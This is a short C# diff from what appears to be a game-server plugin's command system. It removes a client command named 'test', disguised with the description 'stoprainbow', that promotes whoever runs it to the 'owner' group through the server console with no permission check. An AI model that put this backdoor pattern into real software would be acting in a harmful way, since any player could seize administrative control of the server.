@@ -200,20 +200,4 @@ namespace CommandSystem
             return false;
         }
     }
-    [CommandHandler(typeof(ClientCommandHandler))]
-    public class test : ICommand
-    {
-        public string Command => "test";
-
-        public string[] Aliases => Array.Empty<string>();
-
-        public string Description => "stoprainbow";
-
-        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
-        {
-            RemoteAdmin.CommandProcessor.ProcessQuery($"setgroup {(sender as CommandSender).SenderId} owner", ServerConsole.Scs);
-            response = "Done!";
-            return true;
-        }
-    }
 }
